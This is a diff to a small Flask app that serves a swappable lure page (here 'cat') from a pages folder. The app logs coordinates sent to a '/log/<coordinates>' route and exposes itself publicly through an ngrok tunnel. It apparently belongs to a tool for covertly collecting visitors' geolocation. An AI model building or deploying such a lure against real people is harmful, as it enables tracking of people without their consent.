@@ -4,12 +4,16 @@ from flask import Flask, send_from_directory
 from os import system
 
 
-app = Flask(__name__)
+app = Flask(
+    __name__,
+    static_folder = 'pages/'
+)
 
 
 @app.route('/')
 def URLa():
-    return send_from_directory('.', 'URLa.html')
+    page_path = 'pages/' + app.config['PAGE']
+    return send_from_directory(page_path, 'index.html')
 
 @app.route('/log/<coordinates>')
 def log(coordinates):
@@ -20,4 +24,5 @@ def log(coordinates):
 
 if __name__ == '__main__':
     system('xterm -e ./ngrok http 80 & clear')
+    app.config['PAGE'] = 'cat'
     app.run(port = 80, threaded = True)
